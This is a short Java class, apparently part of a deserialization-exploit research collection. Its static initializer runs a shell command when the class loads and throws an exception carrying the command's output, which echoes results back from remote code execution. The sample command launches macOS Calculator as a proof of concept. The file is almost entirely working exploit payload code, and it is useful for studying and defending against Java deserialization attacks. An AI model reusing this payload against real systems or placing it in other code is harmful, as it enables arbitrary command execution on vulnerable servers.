package com.threedr3am.bug.collections.v3.no2;

import java.io.BufferedInputStream;

/**
 * 利用加载时自动执行 & 抛异常回显
 *
 * Created by threedr3am on 2018/5/5.
 */
public class CallbackRuntime2 {
    public static String exec(String cmd) {
        try {
            BufferedInputStream bufferedInputStream = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
            StringBuilder stringBuilder = new StringBuilder();
            byte[] bytes = new byte[4096];
            int len = 0;
            while ((len = bufferedInputStream.read(bytes)) != -1)
                stringBuilder.append(new String(bytes));
            bufferedInputStream.close();
            return stringBuilder.toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }
    static {
        if (true) {
            throw new RuntimeException(exec("/Applications/Calculator.app/Contents/MacOS/Calculator"));
        }
    }
}
